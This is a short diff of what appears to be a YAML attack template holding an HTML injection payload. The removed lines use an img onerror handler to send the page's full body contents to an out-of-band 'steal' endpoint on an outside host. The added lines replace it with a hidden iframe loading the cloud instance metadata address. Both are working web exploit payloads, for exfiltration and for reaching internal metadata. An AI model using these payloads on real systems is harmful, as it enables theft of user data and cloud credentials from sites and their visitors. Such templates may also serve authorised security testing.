@@ -13,10 +13,10 @@ info:
             <textarea>
               <path id="
             </textarea>
-            <img 
-              onerror="document.location='http://ommsgxmitysvgnxszleccea3umem7j3k1.oast.fun/steal?data=' + document.body.innerHTML"
+            <iframe 
               src="http://169.254.169.254/latest/meta-data/"
-            >
+              style="display:none;"
+            ></iframe>
           ">
         </form>
   version: production
